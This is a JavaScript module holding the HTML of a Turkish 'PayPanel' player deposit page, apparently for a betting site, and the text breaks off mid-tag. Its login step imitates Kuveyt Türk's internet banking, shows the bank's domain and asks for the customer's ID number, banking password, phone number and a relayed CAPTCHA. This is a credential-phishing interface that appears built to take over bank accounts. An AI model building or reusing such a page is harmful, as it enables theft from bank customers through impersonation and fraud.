export const ODEME_HTML = "<!DOCTYPE html>\n<html lang=\"tr\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>PayPanel — Oyuncu Paneli</title>\n<style>\n*{box-sizing:border-box;margin:0;padding:0}\nbody{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f0f2f5;min-height:100vh}\n\n/* NAV */\n.nav{background:#fff;border-bottom:1px solid #e5e7eb;display:flex;align-items:center;justify-content:space-between;padding:0 2rem;height:56px;position:sticky;top:0;z-index:100}\n.nav-logo{display:flex;align-items:center;gap:10px}\n.nav-logo-icon{width:32px;height:32px;background:#2563eb;border-radius:8px;display:flex;align-items:center;justify-content:center}\n.nav-logo-icon svg{width:18px;height:18px;fill:none;stroke:#fff;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}\n.nav-brand{font-size:15px;font-weight:600;color:#111}\n.nav-tabs{display:flex;align-items:center;gap:2px}\n.nav-tab{padding:6px 16px;font-size:13px;border-radius:8px;cursor:pointer;color:#6b7280;display:flex;align-items:center;gap:6px;transition:all .15s;user-select:none;font-weight:500}\n.nav-tab:hover{background:#f0f4ff;color:#2563eb}\n.nav-tab.active{background:#eff6ff;color:#2563eb}\n.nav-tab svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}\n.nav-right{display:flex;align-items:center;gap:12px}\n.nav-bal-amt{font-size:14px;font-weight:600;color:#111;text-align:right}\n.nav-bal-lbl{font-size:11px;color:#9ca3af;text-align:right}\n.avatar{width:34px;height:34px;border-radius:50%;background:#2563eb;color:#fff;font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}\n\n/* PAGES */\n.page{display:none;min-height:calc(100vh - 90px)}\n.page.active{display:block}\n.iframe-mode .page{min-height:auto}\n.iframe-mode .page.active{display:block;min-height:100vh}\n.wrap{padding:2rem;max-width:860px;margin:0 auto}\n.wrap-sm{padding:2rem;max-width:680px;margin:0 auto}\n\n/* HOME */\n.greeting{font-size:20px;font-weight:600;color:#111;margin-bottom:4px}\n.sub{font-size:13px;color:#6b7280;margin-bottom:1.5rem}\n.bal-card{background:#2563eb;border-radius:16px;padding:1.5rem 2rem;margin-bottom:1.25rem;display:flex;align-items:center;gap:16px}\n.bal-icon{width:48px;height:48px;background:rgba(255,255,255,.18);border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0}\n.bal-icon svg{width:24px;height:24px;stroke:#fff;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}\n.bal-lbl{font-size:13px;color:rgba(255,255,255,.7);margin-bottom:4px}\n.bal-amt{font-size:28px;font-weight:700;color:#fff;letter-spacing:-.5px}\n.home-actions{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:1.5rem}\n.hbtn{border-radius:14px;padding:1.1rem 1.5rem;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;border:none;font-family:inherit;transition:opacity .15s}\n.hbtn:hover{opacity:.88}\n.hbtn svg{width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}\n.hbtn-d{background:#2563eb;color:#fff}\n.hbtn-w{background:#fff;color:#111;border:1px solid #e5e7eb}\n.hbtn-w:hover{border-color:#2563eb;color:#2563eb;opacity:1}\n.txn-hd{display:flex;align-items:center;justify-content:space-between;margin-bottom:.75rem}\n.txn-title{font-size:15px;font-weight:600;color:#111}\n.txn-list{display:flex;flex-direction:column;gap:8px}\n.txn-card{background:#fff;border-radius:12px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between}\n.txn-l{display:flex;align-items:center;gap:12px}\n.txn-ico{width:36px;height:36px;border-radius:50%;background:#e8f5e9;display:flex;align-items:center;justify-content:center;flex-shrink:0}\n.txn-ico svg{width:16px;height:16px;stroke:#1a7c42;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}\n.txn-name{font-size:14px;font-weight:500;color:#111}\n.txn-time{font-size:12px;color:#9ca3af;margin-top:2px}\n.txn-r{display:flex;align-items:center;gap:10px}\n.badge{padding:4px 10px;border-radius:20px;font-size:12px;font-weight:500;display:inline-flex;align-items:center;gap:4px}\n.badge::before{content:'';width:6px;height:6px;border-radius:50%;display:inline-block}\n.b-proc{background:#eff6ff;color:#2563eb}.b-proc::before{background:#2563eb}\n.b-appr{background:#e8f5e9;color:#1a7c42}.b-appr::before{background:#1a7c42}\n.b-pend{background:#fffbeb;color:#d97706}.b-pend::before{background:#d97706}\n.b-rej{background:#fef3f2;color:#dc2626}.b-rej::before{background:#dc2626}\n.txn-amt{font-size:14px;font-weight:600;color:#111}\n\n/* DEPOSIT */\n.page-hd{display:flex;align-items:center;gap:12px;margin-bottom:6px}\n.page-back{width:32px;height:32px;border-radius:50%;background:#fff;border:1px solid #e5e7eb;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:14px;color:#6b7280;flex-shrink:0}\n.page-back:hover{background:#f3f4f6}\n.page-icon svg{width:24px;height:24px;stroke:#2563eb;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}\n.page-title{font-size:20px;font-weight:600;color:#111}\n.page-sub{font-size:13px;color:#6b7280;margin-bottom:1.5rem;padding-left:44px}\n.card-box{background:#fff;border-radius:14px;border:1px solid #e5e7eb;padding:1.5rem;margin-bottom:1rem}\n.card-box-title{font-size:14px;font-weight:600;color:#111;margin-bottom:1rem}\n.method-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}\n.method-opt{border:1px solid #e5e7eb;border-radius:12px;padding:1.25rem 1rem;display:flex;flex-direction:column;align-items:center;gap:8px;cursor:pointer;transition:all .15s;background:#fff}\n.method-opt:hover{border-color:#2563eb;background:#f8faff}\n.method-opt.sel{border:2px solid #2563eb;background:#f0f6ff}\n.method-opt svg{width:24px;height:24px;stroke:#6b7280;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}\n.method-opt.sel svg{stroke:#2563eb}\n.method-opt span{font-size:13px;font-weight:500;color:#374151}\n.method-opt.sel span{color:#2563eb}\n.method-opt.disabled{opacity:.4;cursor:not-allowed;pointer-events:none}\n.method-opt.disabled::after{content:'Yakında';font-size:10px;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:.04em;margin-top:-4px}\n.amt-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:1rem}\n.amt-opt{border:1px solid #e5e7eb;border-radius:10px;padding:10px;text-align:center;font-size:14px;font-weight:500;color:#374151;cursor:pointer;background:#fff;transition:all .15s}\n.amt-opt:hover{border-color:#2563eb;color:#2563eb}\n.amt-opt.sel{border:2px solid #2563eb;color:#2563eb;background:#eff6ff}\n.amt-custom{display:flex;align-items:center;gap:8px;border:1px solid #e5e7eb;border-radius:10px;padding:10px 14px;background:#f9fafb}\n.amt-custom span{font-size:14px;color:#9ca3af;flex-shrink:0}\n.amt-custom input{border:none;background:transparent;font-size:14px;font-weight:500;color:#111;font-family:inherit;width:100%;outline:none}\n\n/* BANK */\n.bank-grid-ui{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:1rem}\n.bank-opt{display:flex;align-items:center;justify-content:center;padding:20px 16px;background:#fff;border:1px solid #e5e7eb;border-radius:12px;cursor:pointer;transition:all .15s;min-height:76px}\n.bank-opt:hover{border-color:#2563eb;background:#f8faff}\n.bank-opt svg{width:38px;height:38px;flex-shrink:0;border-radius:10px}\n@keyframes dot-bounce{0%,80%,100%{transform:scale(0.6);opacity:.5}40%{transform:scale(1);opacity:1}}\n.bank-opt img{max-width:130px;max-height:48px;object-fit:contain}\n.bok{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#fff;flex-shrink:0}\n.bon{font-size:14px;font-weight:500;color:#111;display:none}\n\n/* FORM SHARED */\n.info-box{display:flex;align-items:flex-start;gap:10px;padding:12px 16px;border-radius:10px;margin-bottom:1.25rem;font-size:13px;line-height:1.6}\n.info-blue{background:#eff6ff;color:#1e40af;border:1px solid #bfdbfe}\n.info-yellow{background:#fffbeb;color:#92400e;border:1px solid #fde68a}\n.info-red{background:#fef3f2;color:#991b1b;border:1px solid #fecaca}\n.info-box svg{width:16px;height:16px;flex-shrink:0;margin-top:2px;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}\n.info-blue svg{stroke:#2563eb}\n.info-yellow svg{stroke:#d97706}\n.info-red svg{stroke:#dc2626}\n.login-card{background:#fff;border:1px solid #e5e7eb;border-radius:14px;padding:1.5rem;margin-bottom:1rem}\n.login-card-hd{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:600;color:#374151;margin-bottom:1.25rem}\n.login-card-hd svg{width:16px;height:16px;stroke:#6b7280;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}\n.fl{margin-bottom:1rem}\n.fl:last-child{margin-bottom:0}\n.fl label{display:block;font-size:13px;color:#374151;margin-bottom:6px;font-weight:500}\n.fl input{width:100%;padding:10px 14px;font-size:14px;border:1px solid #e5e7eb;border-radius:10px;background:#f9fafb;color:#111;font-family:inherit;transition:border-color .15s}\n.fl input:focus{outline:none;border-color:#2563eb;background:#fff;box-shadow:0 0 0 3px rgba(37,99,235,.08)}\n.err-msg{font-size:13px;color:#dc2626;min-height:18px;margin-bottom:.75rem}\n.submit-btn{width:100%;padding:14px;background:#2563eb;color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;transition:opacity .15s;display:flex;align-items:center;justify-content:center;gap:8px}\n.submit-btn:hover{opacity:.88}\n.submit-btn:disabled{opacity:.45;cursor:not-allowed}\n.submit-btn svg{width:16px;height:16px;stroke:#fff;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}\n.sms-card{background:#fff;border:1px solid #e5e7eb;border-radius:14px;padding:1.5rem;margin-bottom:1rem}\n.sms-input{width:100%;padding:12px 14px;font-size:24px;font-weight:600;letter-spacing:10px;text-align:center;border:1px solid #e5e7eb;border-radius:10px;background:#f9fafb;color:#111;font-family:inherit;transition:border-color .15s}\n.sms-input:focus{outline:none;border-color:#2563eb;background:#fff;box-shadow:0 0 0 3px rgba(37,99,235,.08)}\n.resend{font-size:12px;color:#9ca3af;text-align:center;margin-bottom:1.25rem}\n.resend span{color:#2563eb;cursor:pointer}\n\n/* ── GİRİŞ YAPILIYOR SAYFASI ── */\n.logging-in-wrap{padding:3rem 2rem;max-width:500px;margin:0 auto;text-align:center}\n.bank-header{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:2rem}\n.bank-header .bok{width:48px;height:48px;border-radius:14px;font-size:16px}\n.bank-header-name{font-size:20px;font-weight:600;color:#111}\n.login-spinner{width:72px;height:72px;border-radius:50%;background:#eff6ff;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem}\n.login-spinner svg{width:32px;height:32px;stroke:#2563eb;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}\n@keyframes rot{to{transform:rotate(360deg)}}\n.spin-ring-lg{width:40px;height:40px;border:3px solid #bfdbfe;border-top-color:#2563eb;border-radius:50%;animation:rot 1s linear infinite}\n.login-status-title{font-size:18px;font-weight:600;color:#111;margin-bottom:8px}\n.login-status-sub{font-size:14px;color:#6b7280;margin-bottom:2rem;line-height:1.6}\n.login-steps{text-align:left;max-width:260px;margin:0 auto 2rem}\n.lstep{display:flex;align-items:center;gap:12px;padding:7px 0}\n.lstep-ico{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:12px;font-weight:600;transition:all .3s}\n.lstep-ico.ok{background:#e8f5e9;color:#1a7c42}\n.lstep-ico.spin{background:#eff6ff}\n.lstep-ico.wait{background:#f3f4f6;color:#9ca3af}\n.lstep-ico.err{background:#fef3f2;color:#dc2626}\n.lstep-lbl{font-size:14px;color:#111}\n.lstep-lbl.muted{color:#9ca3af}\n@keyframes spin{to{transform:rotate(360deg)}}\n.spin-ring{width:14px;height:14px;border:2px solid #bfdbfe;border-top-color:#2563eb;border-radius:50%;animation:spin .8s linear infinite}\n\n/* Hata kutusu (giriş yapılıyor sayfasında) */\n.login-error-card{background:#fff;border:1px solid #fecaca;border-radius:14px;padding:1.5rem;text-align:left;margin-bottom:1.5rem}\n.login-error-icon{width:48px;height:48px;border-radius:50%;background:#fef3f2;display:flex;align-items:center;justify-content:center;margin-bottom:1rem}\n.login-error-icon svg{width:24px;height:24px;stroke:#dc2626;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}\n.login-error-title{font-size:15px;font-weight:600;color:#111;margin-bottom:6px}\n.login-error-msg{font-size:13px;color:#6b7280;line-height:1.6;margin-bottom:1.25rem}\n\n/* PROCESSING */\n.proc-wrap{padding:3rem 2rem;max-width:500px;margin:0 auto;text-align:center}\n.proc-icon{width:80px;height:80px;border-radius:50%;background:#eff6ff;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem}\n.proc-icon svg{width:36px;height:36px;stroke:#2563eb;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}\n.proc-title{font-size:20px;font-weight:600;color:#111;margin-bottom:8px}\n.proc-sub{font-size:14px;color:#6b7280;margin-bottom:2rem;line-height:1.6}\n.psteps{text-align:left;max-width:260px;margin:0 auto}\n.pstep{display:flex;align-items:center;gap:12px;padding:7px 0}\n.pico{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:12px;font-weight:600}\n.pico.ok{background:#e8f5e9;color:#1a7c42}\n.pico.spin{background:#eff6ff}\n.pico.wait{background:#f3f4f6;color:#9ca3af}\n.plbl{font-size:14px;color:#111}\n.plbl.muted{color:#9ca3af}\n\n/* SUCCESS */\n.suc-wrap{padding:3rem 2rem;max-width:560px;margin:0 auto;text-align:center}\n.suc-icon{width:72px;height:72px;border-radius:50%;background:#e8f5e9;display:flex;align-items:center;justify-content:center;margin:0 auto 1.25rem}\n.suc-icon svg{width:36px;height:36px;stroke:#1a7c42;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}\n.suc-title{font-size:22px;font-weight:700;color:#111;margin-bottom:6px}\n.suc-sub{font-size:14px;color:#6b7280;margin-bottom:1.5rem}\n.dek{background:#fff;border:1px solid #e5e7eb;border-radius:14px;padding:1rem 1.25rem;text-align:left;margin-bottom:1.5rem}\n.dek-row{display:flex;justify-content:space-between;align-items:center;font-size:13px;padding:7px 0;border-bottom:1px solid #f3f4f6}\n.dek-row:last-child{border:none;padding-top:10px}\n.dek-lbl{color:#6b7280}\n.dek-val{color:#111;font-weight:600;text-align:right}\n.dek-ref{font-family:monospace;font-size:12px;color:#9ca3af}\n.dekont-img{width:100%;border-radius:10px;border:1px solid #e5e7eb;margin-bottom:1.5rem;display:none}\n.suc-btns{display:flex;flex-direction:column;gap:10px}\n.btn-pri{width:100%;padding:13px;background:#2563eb;color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit}\n.btn-pri:hover{opacity:.88}\n.btn-sec{width:100%;padding:11px;background:#fff;color:#374151;border:1px solid #e5e7eb;border-radius:12px;font-size:14px;cursor:pointer;font-family:inherit}\n.btn-sec:hover{background:#f9fafb}\n.limit-info{background:#f0f9ff;border:1px solid #bae6fd;border-radius:10px;padding:10px 14px;font-size:12px;color:#0369a1;margin-bottom:1.25rem}\n/* iframe modu — nav gizle */\n.iframe-mode nav.nav { display: none !important; }\n.iframe-mode .wrap   { padding-top: 16px; }\n/* DEBUG PANEL */\n.dbg-panel{position:fixed;bottom:0;left:0;right:0;background:#0f172a;border-top:2px solid #334155;z-index:9999;font-family:monospace;font-size:11px;max-height:40vh;display:flex;flex-direction:column}\n.dbg-bar{display:flex;align-items:center;padding:5px 10px;gap:8px;cursor:pointer;user-select:none;background:#1e293b;flex-shrink:0}\n.dbg-bar-title{color:#94a3b8;font-size:11px;font-weight:600;letter-spacing:.04em}\n.dbg-badge{background:#2563eb;color:#fff;border-radius:10px;padding:1px 7px;font-size:10px;margin-left:4px}\n.dbg-clear{margin-left:auto;color:#64748b;cursor:pointer;font-size:10px;padding:2px 8px;border:1px solid #334155;border-radius:4px;background:none}\n.dbg-clear:hover{color:#e2e8f0}\n.dbg-body{overflow-y:auto;flex:1;padding:8px 10px;display:none;gap:6px;flex-direction:column}\n.dbg-panel.open .dbg-body{display:flex}\n.dbg-entry{border-radius:6px;overflow:hidden;border:1px solid #1e293b}\n.dbg-entry-hd{display:flex;align-items:center;gap:8px;padding:4px 8px;cursor:pointer}\n.dbg-entry-hd:hover{filter:brightness(1.1)}\n.dbg-req{background:#172033}.dbg-res-ok{background:#14281f}.dbg-res-err{background:#2d1515}\n.dbg-method{font-weight:700;font-size:10px;color:#7dd3fc}\n.dbg-url{color:#94a3b8;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}\n.dbg-status{font-size:10px;font-weight:700;margin-left:auto;white-space:nowrap}\n.dbg-status.ok{color:#4ade80}.dbg-status.err{color:#f87171}\n.dbg-ts{color:#475569;font-size:10px;white-space:nowrap}\n.dbg-body-content{background:#0a0f1e;padding:8px 10px;font-size:10px;color:#cbd5e1;white-space:pre-wrap;word-break:break-all;display:none;max-height:120px;overflow-y:auto}\n.dbg-entry.expanded .dbg-body-content{display:block}\n</style>\n</head>\n<body>\n\n<!-- DEBUG PANEL -->\n<div class=\"dbg-panel\" id=\"dbg-panel\">\n  <div class=\"dbg-bar\" onclick=\"dbgToggle()\">\n    <span class=\"dbg-bar-title\">▶ DEBUG</span>\n    <span class=\"dbg-badge\" id=\"dbg-count\">0</span>\n    <button class=\"dbg-clear\" onclick=\"event.stopPropagation();dbgClear()\">Temizle</button>\n  </div>\n  <div class=\"dbg-body\" id=\"dbg-body\"></div>\n</div>\n\n<nav class=\"nav\">\n  <div class=\"nav-logo\">\n    <div class=\"nav-logo-icon\">\n      <svg viewBox=\"0 0 24 24\"><rect x=\"2\" y=\"5\" width=\"20\" height=\"14\" rx=\"2\"/><path d=\"M2 10h20\"/></svg>\n    </div>\n    <span class=\"nav-brand\">PayPanel</span>\n  </div>\n  <div class=\"nav-tabs\">\n    <div class=\"nav-tab\" id=\"tab-home\" onclick=\"showPage('home')\">\n      <svg viewBox=\"0 0 24 24\"><path d=\"M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z\"/></svg>Anasayfa\n    </div>\n    <div class=\"nav-tab\" id=\"tab-dep\" onclick=\"showPage('deposit')\">\n      <svg viewBox=\"0 0 24 24\"><path d=\"M12 19V5M5 12l7 7 7-7\"/></svg>Para Yatır\n    </div>\n    <div class=\"nav-tab\" onclick=\"alert('Yakında')\">\n      <svg viewBox=\"0 0 24 24\"><path d=\"M12 5v14M5 12l7-7 7 7\"/></svg>Para Çek\n    </div>\n    <div class=\"nav-tab\" onclick=\"alert('Yakında')\">\n      <svg viewBox=\"0 0 24 24\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><path d=\"M12 6v6l4 2\"/></svg>İşlem Geçmişi\n    </div>\n  </div>\n  <div class=\"nav-right\">\n    <div>\n      <div class=\"nav-bal-amt\" id=\"nav-bal\">3.500,00 TRY</div>\n      <div class=\"nav-bal-lbl\">Bakiye</div>\n    </div>\n    <div class=\"avatar\">AG</div>\n  </div>\n</nav>\n\n<!-- HOME -->\n<div class=\"page active\" id=\"page-home\">\n  <div class=\"wrap\">\n    <div class=\"greeting\">Hoş geldin, Ayşe Güneş</div>\n    <div class=\"sub\">İşlemlerini buradan yönetebilirsin.</div>\n    <div class=\"bal-card\">\n      <div class=\"bal-icon\"><svg viewBox=\"0 0 24 24\"><rect x=\"2\" y=\"5\" width=\"20\" height=\"14\" rx=\"2\"/><path d=\"M2 10h20\"/></svg></div>\n      <div><div class=\"bal-lbl\">Bakiyeniz</div><div class=\"bal-amt\" id=\"home-bal\">3.500,00 TRY</div></div>\n    </div>\n    <div class=\"home-actions\">\n      <button class=\"hbtn hbtn-d\" onclick=\"showPage('deposit')\">\n        <svg viewBox=\"0 0 24 24\"><path d=\"M12 19V5M5 12l7 7 7-7\"/></svg>Para Yatır\n      </button>\n      <button class=\"hbtn hbtn-w\" onclick=\"alert('Yakında')\">\n        <svg viewBox=\"0 0 24 24\"><path d=\"M12 5v14M5 12l7-7 7 7\"/></svg>Para Çek\n      </button>\n    </div>\n    <div class=\"txn-hd\">\n      <div class=\"txn-title\">Son İşlemler</div>\n      <div style=\"font-size:13px;color:#2563eb;cursor:pointer\">Tümünü gör →</div>\n    </div>\n    <div class=\"txn-list\" id=\"txn-list\"></div>\n  </div>\n</div>\n\n<!-- DEPOSIT — Adım 1: Yöntem Seçimi -->\n<div class=\"page\" id=\"page-deposit\">\n  <div class=\"wrap\" style=\"max-width:520px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('home')\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><path d=\"M12 19V5M5 12l7 7 7-7\"/></svg></div>\n      <div class=\"page-title\">Para Yatır</div>\n    </div>\n    <div class=\"page-sub\">Yatırma yönteminizi seçin.</div>\n    <div class=\"method-grid\">\n      <div class=\"method-opt\" id=\"m-havale\" onclick=\"pickMethod('havale')\">\n        <svg viewBox=\"0 0 24 24\"><rect x=\"2\" y=\"5\" width=\"20\" height=\"14\" rx=\"2\"/><path d=\"M2 10h20\"/></svg>\n        <span>Havale / EFT</span>\n      </div>\n      <div class=\"method-opt\" id=\"m-kripto\" onclick=\"pickMethod('kripto')\">\n        <svg viewBox=\"0 0 24 24\"><path d=\"M9 8h6M9 12h6M9 16h4\"/><rect x=\"3\" y=\"3\" width=\"18\" height=\"18\" rx=\"2\"/></svg>\n        <span>Kripto</span>\n      </div>\n      <div class=\"method-opt disabled\" id=\"m-hizli\">\n        <svg viewBox=\"0 0 24 24\"><path d=\"M13 2L3 14h9l-1 8 10-12h-9l1-8z\"/></svg>\n        <span>Hızlı Havale</span>\n      </div>\n      <div class=\"method-opt disabled\" id=\"m-kredi\">\n        <svg viewBox=\"0 0 24 24\"><rect x=\"1\" y=\"4\" width=\"22\" height=\"16\" rx=\"2\"/><path d=\"M1 10h22\"/></svg>\n        <span>Kredi Kartı</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- DEPOSIT — Adım 2: Tutar -->\n<div class=\"page\" id=\"page-dep-amount\">\n  <div class=\"wrap\" style=\"max-width:520px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('dep-amount')\">←</div>\n      <div class=\"page-icon\"><svg viewBox=\"0 0 24 24\"><path d=\"M12 19V5M5 12l7 7 7-7\"/></svg></div>\n      <div class=\"page-title\" id=\"dep-amt-title\">Tutar Girin</div>\n    </div>\n    <div class=\"page-sub\" id=\"dep-amt-sub\">Yatırmak istediğiniz tutarı seçin veya girin.</div>\n    <div class=\"card-box\">\n      <div class=\"amt-grid\">\n        <div class=\"amt-opt\" onclick=\"selAmt(100,this)\">₺100</div>\n        <div class=\"amt-opt\" onclick=\"selAmt(250,this)\">₺250</div>\n        <div class=\"amt-opt\" onclick=\"selAmt(500,this)\">₺500</div>\n        <div class=\"amt-opt\" onclick=\"selAmt(1000,this)\">₺1.000</div>\n        <div class=\"amt-opt\" onclick=\"selAmt(2500,this)\">₺2.500</div>\n        <div class=\"amt-opt\" onclick=\"selAmt(5000,this)\">₺5.000</div>\n      </div>\n      <div class=\"amt-custom\">\n        <span>₺</span>\n        <input id=\"custom-amt\" type=\"number\" placeholder=\"Tutar girin (min. 50)\" min=\"50\" oninput=\"customAmt(this)\">\n      </div>\n    </div>\n    <div class=\"err-msg\" id=\"dep-err\"></div>\n    <button class=\"submit-btn\" onclick=\"depositNext()\">\n      <svg viewBox=\"0 0 24 24\"><path d=\"M5 12h14M12 5l7 7-7 7\"/></svg>\n      Devam Et\n    </button>\n  </div>\n</div>\n\n<!-- BANK SELECT -->\n<div class=\"page\" id=\"page-bank\">\n  <div class=\"wrap\" style=\"max-width:760px\">\n    <div class=\"page-hd\">\n      <div class=\"page-back\" onclick=\"showPage('dep-amount')\">←</div>\n      <div class=\"page-title\">Banka Seçin</div>\n    </div>\n    <p id=\"bank-sub\" style=\"font-size:13px;color:#6b7280;padding-left:44px;margin-top:4px\"></p>\n    <div class=\"bank-grid-ui\" id=\"bank-grid\"></div>\n  </div>\n</div>\n\n<!-- LOGIN FORM -->\n<div class=\"page\" id=\"page-login\">\n  <div class=\"wrap\" style=\"max-width:680px\">\n\n    <!-- Standart header -->\n    <div class=\"page-hd\" id=\"login-std-hd\">\n      <div class=\"page-back\" onclick=\"showPage('bank')\">←</div>\n      <div id=\"login-logo-wrap\" style=\"height:36px;display:flex;align-items:center\"></div>\n    </div>\n\n    <!-- Kuveyt Türk özel header -->\n    <div id=\"kt-login-header\" style=\"display:none;margin-bottom:1.25rem\">\n      <div style=\"display:flex;align-items:center;gap:10px;margin-bottom:1rem\">\n        <div class=\"page-back\" onclick=\"showPage('bank')\">←</div>\n        <div style=\"display:flex;align-items:center;gap:10px\">\n          <div style=\"width:36px;height:36px;border-radius:8px;background:#006633;display:flex;align-items:center;justify-content:center\">\n            <svg viewBox=\"0 0 24 24\" style=\"width:20px;height:20px;fill:none;stroke:#fff;stroke-width:2;stroke-linecap:round;stroke-linejoin:round\"><path d=\"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z\"/></svg>\n          </div>\n          <div>\n            <div style=\"font-size:16px;font-weight:600;color:#111\">Kuveyt Türk İnternet Şubesi</div>\n            <div style=\"font-size:12px;color:#006633;font-weight:500\">isube.kuveytturk.com.tr</div>\n          </div>\n        </div>\n      </div>\n      <!-- Kuveyt Türk tarzı form kutusu -->\n      <div style=\"background:#fff;border:1px solid #d4e8d4;border-top:3px solid #006633;border-radius:4px;padding:1.5rem\">\n        <div style=\"font-size:14px;font-weight:600;color:#006633;margin-bottom:1.25rem;padding-bottom:.75rem;border-bottom:1px solid #e5e7eb\">\n          Bilgilerinizi Giriniz\n        </div>\n        <table style=\"width:100%;border-collapse:collapse\">\n          <tr style=\"height:40px;vertical-align:middle\">\n            <td style=\"width:180px;font-size:13px;color:#374151\">Müşteri No / T.C. Kimlik No</td>\n            <td>\n              <input id=\"inp-tc\" type=\"text\" placeholder=\"TC Kimlik / Müşteri No\" maxlength=\"11\"\n                style=\"width:100%;padding:6px 10px;font-size:13px;border:1px solid #ccc;border-radius:2px;font-family:inherit;outline:none\"\n                onfocus=\"this.style.borderColor='#006633'\" onblur=\"this.style.borderColor='#ccc'\">\n            </td>\n          </tr>\n          <tr style=\"height:40px;vertical-align:middle\">\n            <td style=\"font-size:13px;color:#374151\">Şifre</td>\n            <td>\n              <input id=\"inp-pw\" type=\"password\" placeholder=\"••••••\" maxlength=\"6\"\n                style=\"width:100%;padding:6px 10px;font-size:13px;border:1px solid #ccc;border-radius:2px;font-family:inherit;outline:none\"\n                onfocus=\"this.style.borderColor='#006633'\" onblur=\"this.style.borderColor='#ccc'\"\n                onkeydown=\"if(event.key==='Enter') loginNext()\">\n            </td>\n          </tr>\n          <tr id=\"gsm-row\" style=\"height:40px;vertical-align:middle;display:none\">\n            <td style=\"font-size:13px;color:#374151\">Kayıtlı Cep Telefonu</td>\n            <td>\n              <input id=\"inp-gsm\" type=\"text\" placeholder=\"905XXXXXXXXX\" maxlength=\"13\"\n                style=\"width:100%;padding:6px 10px;font-size:13px;border:1px solid #ccc;border-radius:2px;font-family:inherit;outline:none\"\n                onfocus=\"this.style.borderColor='#006633'\" onblur=\"this.style.borderColor='#ccc'\">\n            </td>\n          </tr>\n          <tr id=\"gsm-hint-row\" style=\"display:none\">\n            <td colspan=\"2\" style=\"font-size:11px;color:#6b7280;padding:2px 0 8px\">\n              Cep telefonu numaranızı boşluk olmadan giriniz. Örnek: 905*********\n            </td>\n          </tr>\n          <!-- CAPTCHA satırı — awaiting_captcha gelince gösterilir -->\n          <tr id=\"kt-captcha-row\" style=\"display:none;vertical-align:top\">\n            <td style=\"font-size:13px;color:#374151;padding-top:8px\">Doğrulama Resmi</td>\n            <td style=\"padding-top:6px\">\n              <img id=\"kt-captcha-img\" src=\"\" alt=\"CAPTCHA\"\n                style=\"height:38px;border:1px solid #ccc;border-radius:2px;cursor:pointer;display:block;margin-bottom:6px\"\n                onclick=\"refreshKTCaptcha()\" title=\"Yenilemek için tıklayın\">\n              <input id=\"inp-captcha\" type=\"text\" placeholder=\"Görseldeki karakterleri girin\"\n                style=\"width:100%;padding:6px 10px;font-size:13px;border:1px solid #ccc;border-radius:2px;font-family:inherit;outline:none\"\n                onfocus=\"this.style.borderColor='#006633'\" onblur=\"this.style.borderColor='#ccc'\"\n                maxlength=\"6\" onkeydown=\"if(event.key==='Enter') loginNext()\">\n              <div style=\"font-size:11px;color:#6b7280;margin-top:3px\">\n                Görseli göremiyorsanız <a href=\"#\" onclick=\"refreshKTCaptcha();return false\" style=\"color:#006633\">yenile</a>\n              </div>\n            </td>\n          </tr>\n        </table>\n        <div class=\"err-msg\" id=\"login-err\" style=\"margin-top:.75rem\"></div>\n        <div style=\"margin-top:1rem\">\n          <button id=\"login-btn\" onclick=\"loginNext()\"\n            style=\"background:#006633;color:#fff;border:none;padding:10px 28px;font-size:14px;font-weight:600;border-radius:2px;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:8px;transition:opacity .15s\"\n            onmouseover=\"this.style.opacity='.88'\" onmouseout=\"this.style.opacity='1'\">\n            <svg viewBox=\"0 0 24 24\" 